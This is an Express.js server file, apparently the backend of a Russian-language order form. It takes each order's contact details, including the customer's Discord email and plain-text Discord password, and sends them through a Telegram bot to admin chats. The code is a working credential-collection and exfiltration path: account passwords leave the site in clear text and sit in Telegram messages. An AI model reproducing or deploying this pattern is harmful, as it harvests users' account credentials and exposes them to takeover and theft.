import express from 'express'
import cors from 'cors'
import { readFileSync } from 'fs'
import { resolve, dirname } from 'path'
import { fileURLToPath } from 'url'

const __dirname = dirname(fileURLToPath(import.meta.url))

const env = Object.fromEntries(
  readFileSync(resolve(__dirname, '../.env'), 'utf-8')
    .split('\n')
    .filter(Boolean)
    .map(l => l.split('='))
    .map(([k, ...v]) => [k.trim(), v.join('=').trim()])
)

const BOT_TOKEN = env.BOT_TOKEN
const ADMIN_IDS = (env.ADMIN_IDS || '').split(',').map(s => s.trim()).filter(Boolean)
const PORT = parseInt(env.PORT || '3001')

const app = express()
app.use(cors())
app.use(express.json())

function formatOrder(data) {
  const items = data.cart.map((item, i) => `${i + 1}. ${item.label} — ${item.priceRUB} ₽`).join('\n')
  return [
    '🛒 <b>Новый заказ с сайта</b>',
    '',
    '<b>Контактные данные:</b>',
    `📧 Email: ${data.email || '—'}`,
    `✉️ Discord email: ${data.discordEmail || '—'}`,
    `🔑 Discord пароль: ${data.discordPassword || '—'}`,
    `💬 Telegram: ${data.telegram || '—'}`,
    '',
    '<b>Способ оплаты:</b> ' + (data.payment === 'card' ? '💳 Карта' : data.payment === 'sbp' ? '⚡ СБП' : '₿ Crypto (OxaPay)'),
    '',
    '<b>Состав заказа:</b>',
    items,
    '',
    `💰 <b>Итого:</b> ${data.total} ₽`,
    '',
    '📌 <i>Заказ оформлен через сайт, не через бота</i>'
  ].join('\n')
}

app.post('/api/order', async (req, res) => {
  try {
    const text = formatOrder(req.body)
    const results = await Promise.allSettled(
      ADMIN_IDS.map(adminId =>
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: adminId, text, parse_mode: 'HTML' })
        }).then(r => r.json())
      )
    )
    const ok = results.some(r => r.status === 'fulfilled' && r.value?.ok)
    if (ok) {
      res.json({ ok: true })
    } else {
      console.error('Telegram send failed:', results)
      res.status(500).json({ ok: false, error: 'Failed to send to Telegram' })
    }
  } catch (err) {
    console.error(err)
    res.status(500).json({ ok: false, error: err.message })
  }
})

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`)
})
